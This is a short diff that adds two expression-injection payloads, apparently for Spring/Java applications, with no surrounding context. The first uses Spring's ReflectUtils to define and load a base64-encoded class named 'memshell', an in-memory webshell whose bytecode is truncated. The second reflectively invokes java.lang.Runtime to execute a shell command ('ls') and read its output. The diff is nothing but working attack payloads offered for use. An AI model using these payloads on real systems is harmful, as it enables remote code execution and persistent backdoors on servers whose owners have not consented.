@@ -1,0 +1,4 @@
+${T(org.springframework.cglib.core.ReflectUtils).defineClass('memshell',T(org.springframework.util.Base64Utils).decodeFromUrlSafeString('yv66vgAAA....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())}
+
+
+''.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('ls').inputStream.readAllBytes()
